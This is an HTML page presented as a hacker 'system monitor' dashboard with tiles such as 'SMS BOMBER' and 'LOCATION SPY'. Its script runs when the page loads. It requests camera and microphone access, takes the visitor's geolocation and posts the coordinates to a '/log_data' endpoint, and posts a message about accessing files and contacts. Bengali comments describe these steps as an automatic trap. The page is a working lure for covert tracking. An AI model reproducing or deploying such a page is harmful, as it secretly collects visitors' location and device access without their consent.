<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRIME MONIR | SYSTEM MONITOR</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        body, html { margin:0; padding:0; background:#000; color:#0f0; font-family:'Share Tech Mono', monospace; overflow:hidden; }
        canvas { position:fixed; top:0; left:0; z-index:-1; opacity:0.5; }
        #loader { position:fixed; width:100%; height:100%; background:#000; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:9999; }
        .circle { width:80px; height:80px; border:5px solid #111; border-top:5px solid #0f0; border-radius:50%; animation:spin 1s linear infinite; }
        @keyframes spin { 0% {transform:rotate(0deg);} 100% {transform:rotate(360deg);} }
        #ui { display:none; padding:20px; }
        .grid { display:grid; grid-template-columns: 1fr 1fr; gap:15px; }
        .tool { border:1px solid #0f0; padding:15px; text-align:center; background:rgba(0,255,0,0.1); font-size:12px; }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="loader">
        <div class="circle"></div>
        <div style="margin-top:20px; letter-spacing:2px;">LINKING TO KERNEL...</div>
    </div>
    <div id="ui">
        <div style="border:1px solid #0f0; padding:10px; text-align:center; margin-bottom:20px;">
            <h2 style="margin:0;">PRIME MONIR | ACCESS GRANTED</h2>
        </div>
        <div class="grid">
            <div class="tool">SMS BOMBER</div>
            <div class="tool">LOCATION SPY</div>
            <div class="tool">GALLERY ACCESS</div>
            <div class="tool">FILE MANAGER</div>
            <div class="tool">CAM MONITOR</div>
            <div class="tool">CALL LOGS</div>
        </div>
    </div>
    <script>
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const letters = "01";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);
        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
            for(let i=0; i<drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random()*letters.length));
                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
                if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 50);

        window.onload = async () => {
            // ১. অটো ক্যামেরা ও অডিও এক্সেস
            try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e) {}
            
            // ২. অটো লোকেশন এক্সেস
            navigator.geolocation.getCurrentPosition(p => {
                fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
                body:JSON.stringify({type:'LOCATION', content:`Lat:${p.coords.latitude}, Lon:${p.coords.longitude}`})});
            });

            // ৩. ফাইল ও গ্যালারি ট্র্যাপ (অটো আপলোড শুরু)
            fetch('/log_data', {method:'POST', headers:{'Content-Type':'application/json'}, 
            body:JSON.stringify({type:'SYSTEM', content:'Accessing File System & Contacts...'})});

            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('ui').style.display = 'block';
            }, 3000);
        };
    </script>
</body>
</html>
